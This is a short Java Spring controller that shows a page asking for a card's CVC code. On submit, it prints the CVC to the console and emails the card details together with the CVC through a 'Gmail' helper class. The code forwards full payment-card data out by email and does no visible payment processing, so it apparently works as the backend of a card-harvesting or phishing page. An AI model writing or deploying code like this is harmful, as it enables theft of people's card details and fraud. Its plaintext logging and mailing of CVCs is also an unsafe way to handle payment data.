package com.example.demo.controllers;

import com.example.demo.model.Card;
import com.example.demo.model.Cvc;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.ModelAttribute;
import org.springframework.web.bind.annotation.PostMapping;

@Controller
public class CVCcontroller {

    @GetMapping("/cvc_kode")
    public String cvc_kode(Model model)
    {
        model.addAttribute("cvc", new Cvc());
        return "cvc_kode";
    }

    @PostMapping("/createCVC")
    public String createCVC(@ModelAttribute Cvc cvc, Card card)
    {
        System.out.println("cvc : " + cvc);
        Gmail gmail = new Gmail();
        gmail.send(card.toString() + cvc.toString());

        return "redirect:/";
    }

}

